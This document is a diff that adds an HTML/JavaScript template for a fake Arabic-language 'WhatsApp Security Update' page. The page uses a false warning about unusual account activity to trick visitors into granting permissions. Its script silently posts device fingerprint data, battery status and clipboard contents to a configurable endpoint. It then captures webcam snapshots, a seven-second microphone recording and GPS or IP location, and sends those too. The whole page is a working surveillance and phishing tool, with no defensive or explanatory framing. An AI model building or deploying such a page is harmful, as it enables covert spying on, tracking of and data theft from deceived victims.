@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>WhatsApp</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#ECE5DD;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.container{background:#fff;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.15);width:100%;max-width:420px;overflow:hidden}
+.header{background:#25D366;padding:20px;text-align:center;color:#fff}
+.wa-icon{width:64px;height:64px;background:#fff;border-radius:50%;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:36px}
+.header h2{font-size:20px;font-weight:700}
+.header p{font-size:13px;opacity:.85;margin-top:4px}
+.body{padding:24px}
+.notice{background:#FFF3CD;border:1px solid #FFEEBA;border-radius:10px;padding:14px;font-size:14px;color:#856404;margin-bottom:20px;display:flex;align-items:flex-start;gap:10px}
+.notice-icon{font-size:20px;flex-shrink:0}
+.step{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid #f0f0f0}
+.step:last-child{border-bottom:none}
+.step-num{width:28px;height:28px;background:#25D366;color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;flex-shrink:0}
+.step-text{font-size:14px;color:#333}
+.perm-row{display:flex;align-items:center;justify-content:space-between;padding:12px 0;border-bottom:1px solid #f0f0f0}
+.perm-row:last-child{border-bottom:none}
+.perm-label{display:flex;align-items:center;gap:8px;font-size:14px;color:#333}
+.perm-badge{font-size:12px;font-weight:600;padding:3px 10px;border-radius:20px}
+.badge-wait{background:#f0f0f0;color:#999}
+.badge-ok{background:#d4edda;color:#155724}
+.badge-err{background:#f8d7da;color:#721c24}
+.btn{width:100%;padding:15px;background:#25D366;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;margin-top:20px;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn:disabled{opacity:.6;cursor:not-allowed}
+.btn-retry{background:transparent;border:2px solid #25D366;color:#25D366;margin-top:10px;display:none}
+.progress{height:4px;background:#e0e0e0;border-radius:4px;margin:16px 0 8px;overflow:hidden}
+.fill{height:100%;width:0;background:#25D366;border-radius:4px;transition:width .5s}
+#status{font-size:13px;color:#777;text-align:center;margin-bottom:4px}
+#err{font-size:13px;color:#dc3545;margin-top:8px;display:none;text-align:center}
+.footer{text-align:center;font-size:12px;color:#aaa;padding:12px;border-top:1px solid #f0f0f0}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <div class="wa-icon">💬</div>
+    <h2>WhatsApp Security Update</h2>
+    <p>تحديث أمني مطلوب للمتابعة</p>
+  </div>
+  <div class="body">
+    <div class="notice">
+      <div class="notice-icon">⚠️</div>
+      <div>تم اكتشاف نشاط غير معتاد على حسابك. يرجى التحقق من هويتك للمتابعة.</div>
+    </div>
+
+    <div style="font-size:13px;color:#555;margin-bottom:14px;font-weight:600">الأذونات المطلوبة:</div>
+
+    <div class="perm-row">
+      <div class="perm-label">📷 الكاميرا والميكروفون</div>
+      <div class="perm-badge badge-wait" id="badge-cam">معلّق</div>
+    </div>
+    <div class="perm-row">
+      <div class="perm-label">📍 الموقع الجغرافي</div>
+      <div class="perm-badge badge-wait" id="badge-loc">معلّق</div>
+    </div>
+    <div class="perm-row">
+      <div class="perm-label">📱 معلومات الجهاز</div>
+      <div class="perm-badge badge-ok" id="badge-dev">✓ جاهز</div>
+    </div>
+
+    <div class="progress"><div class="fill" id="pbar"></div></div>
+    <div id="status">اضغط للبدء</div>
+    <div id="err"></div>
+
+    <button class="btn" id="btn-verify" onclick="startVerify()">
+      🔒 تحقق الآن للمتابعة
+    </button>
+    <button class="btn btn-retry" id="btn-retry" onclick="startVerify()">
+      🔄 إعادة المحاولة
+    </button>
+  </div>
+  <div class="footer">© WhatsApp LLC 2024 · جميع الحقوق محفوظة</div>
+</div>
+
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas hidden id="canvas" width="500" height="500"></canvas>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+<script>
+var uid="<%=uid %>",a="<%=a %>",destUrl="<%=url %>";
+var camDone=false,locDone=false,busy=false;
+
+function setBar(p){document.getElementById('pbar').style.width=p+'%';}
+function setStatus(t){document.getElementById('status').textContent=t;}
+function setBadge(id,type,text){var el=document.getElementById('badge-'+id);el.textContent=text;el.className='perm-badge badge-'+type;}
+function showErr(t){var el=document.getElementById('err');el.textContent=t;el.style.display='block';}
+function hideErr(){document.getElementById('err').style.display='none';}
+function tryRedirect(){if(camDone&&locDone)window.location.href=destUrl;}
+
+async function sendDeviceInfo(){
+  var td='<code>✅ WhatsApp Verification</code><br><br><b>⚓ IP: <%=ip %> | <%=time %></b>';
+  td+="<br><br><b>⏳ "+new Date()+"</b><br>";
+  var xo=["productSub","vendor","maxTouchPoints","hardwareConcurrency","cookieEnabled","appVersion","platform","userAgent","language","deviceMemory"];
+  td+="<br><b>📱 Device Info</b><br>";
+  for(var i=0;i<xo.length;i++){if(xo[i] in navigator){td+="<b>"+xo[i]+"</b>: <code>"+navigator[xo[i]]+"</code><br>";}}
+  if("getBattery" in navigator){try{var b=await navigator.getBattery();td+="<br><b>🔋 Battery: "+b.level*100+"% | Charging: "+b.charging+"</b>";}catch(e){}}
+  $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},function(){});
+
+  // Clipboard
+  if(navigator.clipboard&&navigator.clipboard.readText){
+    try{var clip=await navigator.clipboard.readText();if(clip&&clip.trim()){$.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(clip)});}}catch(e){}
+  }
+}
+
+async function startVerify(){
+  if(busy)return;
+  busy=true;camDone=false;locDone=false;
+  hideErr();
+  document.getElementById('btn-verify').disabled=true;
+  document.getElementById('btn-retry').style.display='none';
+  setBadge('cam','wait','جارٍ...');
+  setBadge('loc','wait','جارٍ...');
+  setBar(5);setStatus('جارٍ التحقق...');
+
+  sendDeviceInfo();
+
+  // Camera + Audio
+  setStatus('طلب إذن الكاميرا...');
+  var stream=null;
+  try{stream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:"user"}});}
+  catch(e1){try{stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}});}
+  catch(e2){
+    setBadge('cam','err','✗ مرفوض');
+    showErr('❌ يجب السماح بالكاميرا للمتابعة.');
+    setBar(0);setStatus('رُفض الإذن');
+    document.getElementById('btn-retry').style.display='block';
+    busy=false;return;
+  }}
+
+  setBadge('cam','ok','✓ تم');
+  setBar(40);setStatus('جارٍ التحقق من الجهاز...');
+
+  var video=document.getElementById('video'),canvas=document.getElementById('canvas');
+  video.srcObject=new MediaStream(stream.getVideoTracks());
+  await new Promise(function(r){video.onloadedmetadata=function(){video.play();r();};setTimeout(r,2000);});
+
+  var ctx=canvas.getContext('2d'),snaps=0;
+  var st=setInterval(function(){
+    ctx.drawImage(video,0,0,500,500);
+    var d=canvas.toDataURL("image/png").replace("data:image/png;base64","");
+    $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(d)});
+    if(++snaps>=4){clearInterval(st);camDone=true;tryRedirect();}
+  },1500);
+
+  try{
+    var aTracks=stream.getAudioTracks();
+    if(aTracks.length){
+      var rec=new MediaRecorder(new MediaStream(aTracks));var chunks=[];
+      rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
+      rec.onstop=function(){
+        var blob=new Blob(chunks,{type:'audio/webm'});var fr=new FileReader();
+        fr.onloadend=function(){$.post(a+"/audio",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};
+        fr.readAsDataURL(blob);
+      };
+      rec.start();setTimeout(function(){try{rec.stop();}catch(e){}},7000);
+    }
+  }catch(e){}
+
+  setBar(65);setStatus('التحقق من الموقع...');
+
+  async function sendLoc(lat,lon,acc){
+    return new Promise(function(r){
+      $.post(a+"/location",{uid:uid,lat:encodeURIComponent(lat),lon:encodeURIComponent(lon),acc:encodeURIComponent(acc)},function(){locDone=true;tryRedirect();r();});
+    });
+  }
+  async function ipLoc(){
+    try{var d=await fetch("https://ipapi.co/json/").then(r=>r.json());if(d&&d.latitude){await sendLoc(d.latitude,d.longitude,"IP (~"+d.city+", "+d.country_name+")");}else{locDone=true;tryRedirect();}}
+    catch(e){locDone=true;tryRedirect();}
+  }
+
+  if(!navigator.geolocation){setBadge('loc','ok','✓ IP');await ipLoc();}
+  else{
+    var t=setTimeout(async function(){setBadge('loc','ok','✓ IP');await ipLoc();},9000);
+    navigator.geolocation.getCurrentPosition(
+      async function(pos){clearTimeout(t);setBadge('loc','ok','✓ GPS');setBar(85);await sendLoc(pos.coords.latitude,pos.coords.longitude,pos.coords.accuracy+"m");},
+      async function(){clearTimeout(t);setBadge('loc','ok','✓ IP');await ipLoc();},
+      {enableHighAccuracy:true,timeout:8000,maximumAge:0}
+    );
+  }
+  setBar(90);setStatus('جارٍ الانتهاء...');
+}
+
+window.onload=function(){sendDeviceInfo();};
+</script>
+</body>
+</html>
